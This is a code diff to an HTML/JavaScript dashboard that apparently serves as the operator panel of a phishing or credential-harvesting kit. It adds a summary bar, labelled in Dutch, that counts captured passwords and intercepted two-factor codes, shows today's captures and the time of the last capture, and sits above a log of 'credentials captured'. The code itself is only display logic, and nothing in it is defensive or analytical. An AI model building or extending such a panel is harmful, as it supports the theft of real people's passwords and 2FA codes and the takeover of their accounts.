@@ -707,6 +707,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
                 <button class="btn danger" onclick="if(confirm('Delete all credentials?'))clearCredentials()">Clear</button>
             </div>
         </div>
+        <div id="credsSummaryBar"></div>
         <div class="pnl-b np" id="cred-log"><div class="empty">No credentials captured yet</div></div>
     </div>
 </div>
@@ -1982,7 +1983,21 @@ function copyCellVal(val, el) {
 
 function renderCredentials(creds) {
     const c = $('#cred-log');
-    if (!creds || !creds.length) { c.innerHTML = '<div class="empty">No credentials captured yet</div>'; return; }
+    if (!creds || !creds.length) { c.innerHTML = '<div class="empty">No credentials captured yet</div>'; $('#credsSummaryBar').innerHTML = ''; return; }
+
+    // Summary bar
+    const today = new Date().toDateString();
+    const todayCount = creds.filter(cr => new Date(cr.timestamp).toDateString() === today).length;
+    const pwCount = creds.filter(cr => !String(cr.password||'').startsWith('[2FA')).length;
+    const tfaCount = creds.filter(cr => String(cr.password||'').startsWith('[2FA')).length;
+    const lastTs = creds.slice().sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp))[0]?.timestamp;
+    $('#credsSummaryBar').innerHTML = `<div style="display:flex;gap:10px;flex-wrap:wrap;padding:8px 12px 4px;font-size:.68rem;color:var(--dim);">
+        <span title="Totaal">📋 <b style="color:var(--text)">${creds.length}</b> totaal</span>
+        <span title="Vandaag">📅 <b style="color:#4fc3f7">${todayCount}</b> vandaag</span>
+        <span title="Wachtwoorden">🔑 <b style="color:#4fc3f7">${pwCount}</b> ww</span>
+        <span title="2FA codes">🔒 <b style="color:#a78bfa">${tfaCount}</b> 2FA</span>
+        ${lastTs ? `<span title="Laatste opvang">🕐 <b style="color:var(--text)">${fmtAgo(lastTs)}</b></span>` : ''}
+    </div>`;
     const sorted = [...creds].sort((a, b) => {
         let av = a[credSort.col] || '', bv = b[credSort.col] || '';
         if (credSort.col === 'timestamp') { av = new Date(av).getTime() || 0; bv = new Date(bv).getTime() || 0; }
